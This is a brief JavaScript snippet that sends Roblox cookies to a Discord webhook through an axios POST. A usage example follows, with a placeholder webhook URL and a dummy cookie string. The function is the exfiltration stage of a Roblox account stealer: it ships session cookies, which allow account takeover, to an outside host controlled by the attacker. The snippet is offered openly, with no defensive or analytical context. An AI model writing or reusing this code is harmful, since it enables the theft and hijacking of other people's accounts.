const axios = require('axios');

function logRobloxCookiesToDiscordWebhook(webhookUrl, cookies) {
    axios.post(webhookUrl, {
        content: `Roblox Cookies: ${cookies}`
    })
    .then(response => {
        console.log('Cookies logged successfully');
    })
    .catch(error => {
        console.error('Error logging cookies:', error);
    });
}

// Usage Example
const webhookUrl = 'https://discord.com/api/webhooks/1234567890/abcdefg';
const cookies = 'ABC123XYZ456';
logRobloxCookiesToDiscordWebhook(webhookUrl, cookies);
